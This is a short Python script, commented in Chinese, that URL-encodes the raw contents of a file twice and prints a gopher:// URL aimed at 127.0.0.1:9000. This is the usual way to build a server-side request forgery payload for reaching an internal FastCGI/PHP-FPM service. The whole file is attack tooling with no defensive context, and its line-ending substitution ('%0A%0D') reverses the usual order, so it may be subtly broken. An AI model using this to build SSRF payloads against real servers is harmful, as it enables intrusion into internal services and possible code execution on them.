# -*- coding: UTF-8 -*-
from urllib.parse import quote, unquote, urlencode
# urllib.parse.quote 是 Python 标准库中 urllib.parse 模块提供的一个函数，用于将字符串中的特殊字符转义为 URL 安全的格式。
# urllib.parse.quote(string, safe='/', encoding=None, errors=None)
file= open('1.txt','rb')
payload= file.read()
payload= quote(payload).replace("%0A","%0A%0D")
print("gopher://127.0.0.1:9000/_"+quote(payload))